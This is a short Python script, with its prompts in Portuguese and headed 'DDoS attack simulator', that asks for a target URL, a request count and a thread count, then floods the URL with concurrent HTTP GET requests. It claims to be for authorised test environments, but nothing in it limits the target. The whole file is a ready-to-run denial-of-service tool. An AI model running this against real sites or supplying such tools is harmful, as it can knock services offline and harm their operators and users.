import requests
from concurrent.futures import ThreadPoolExecutor
import time

def ddos_attack(url, num_requests, num_threads):
    def attack():
        try:
            response = requests.get(url)
            print(f"[{response.status_code}] Requisição para {url} concluída.")
        except requests.RequestException as e:
            print(f"Erro ao fazer requisição: {e}")

    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        futures = [executor.submit(attack) for _ in range(num_requests)]
        for future in futures:
            try:
                future.result()  # Espera a conclusão da tarefa
            except Exception as e:
                print(f"Erro na execução da thread: {e}")

if __name__ == "__main__":
    print("\n\t\t============== Simulador de Ataque DDoS ==============")
    print("\n\n\t\t=================== Seja Bem Vindo ==================")
    print("\nEste programa simula um ataque DDoS em um ambiente de teste autorizado.")
    
    url = input("\n\tDigite o URL alvo do teste (ex: http://example.com): ")
    num_requests = int(input("\n\tNúmero de requisições a serem enviadas: "))
    num_threads = int(input("\n\tNúmero de threads simultâneas: "))
    
    print("\nIniciando o ataque DDoS. Por favor, aguarde...")
    start_time = time.time()
    ddos_attack(url, num_requests, num_threads)
    print(f"\nAtaque concluído em {time.time() - start_time:.2f} segundos.")
